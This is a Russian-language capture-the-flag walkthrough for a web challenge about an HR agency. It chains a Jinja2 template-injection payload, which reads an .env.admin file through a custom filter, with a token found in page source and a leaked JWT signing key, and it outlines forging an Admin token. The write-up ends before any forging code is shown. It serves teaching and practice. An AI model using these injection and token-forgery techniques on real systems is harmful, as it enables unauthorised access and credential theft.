# Решение задачи HR-агентство

## Общая информация

- **Уровень:** Hard
- **Категория:** web
- **Уязвимости:** SSTI (Jinja2), JWT Forgery
- **Вектор атаки:** SSTI → Чтение ENV → Кража JWT_KEY → Подделка токена → Доступ к admin-панели

---

## Этап 1: Поиск SSTI

Переходим на страницу **"Добавить HR"** (`/add/hr`). Заполняем форму и тестируем поля на уязвимости.

Проверка на SSTI через payload в поле **"Организация"**:
```
{{7*7}}
```

---

## Этап 2: Поиск дополнительной информации

### 2.1 Страница отладки

С помощью dirb находим страницу:
```
/debug
```

На странице сообщение об ошибке фильтра `_ae`. Это подсказка о существовании некоторого фильтра, который требует токен.

### 2.2 Поиск secret_token

Переходим на страницу **"Поддержка"** (`/support`). Просматриваем код html страницы support.
В JavaScript-коде находим комментарий:
```javascript
// secret_token: ad563982011c2685d697a1aeb1e9552ec401cc47500853d3db876a8d71317350
```

---

## Этап 3: Эксплуатация SSTI и чтение .env.admin

### 3.1 Вызов фильтра _ae

Используем SSTI для вызова кастомного фильтра `_ae`:

```jinja2
{{''|_ae('ad563982011c2685d697a1aeb1e9552ec401cc47500853d3db876a8d71317350', '.env.admin')}}
```

Вводим этот payload в поле **"Организация"** при создании HR-агента.

### 3.2 Полученные данные

В ответе получаем содержимое `.env.admin`:
```
JWT_KEY="137e3e2b37c48351cd9576cb1f52b644d1ae2287ae8cd2a7c92486670c719ee6"
JWT_ALGO="HS256"
ADMIN_URL="/relay/h4v3n/EchoOverr1de/adminGate9k3z"
STATE="q6d1tEg1r_MFhOicoiUFCwOH"
```

**Ключевые данные:**
- `JWT_KEY` — ключ для подписи JWT-токенов
- `ADMIN_URL` — путь к скрытой admin-панели

---

## Этап 4: Подделка JWT-токена

### 4.1 Структура JWT

Оригинальный токен содержит:
```json
{
  "sub": "username",
  "status": "User",
  "exp": 1234567890,
  "iat": 1234567800
}
```

### 4.2 Создание поддельного токена

Используем украденный `JWT_KEY` для создания токена со статусом `Admin`.
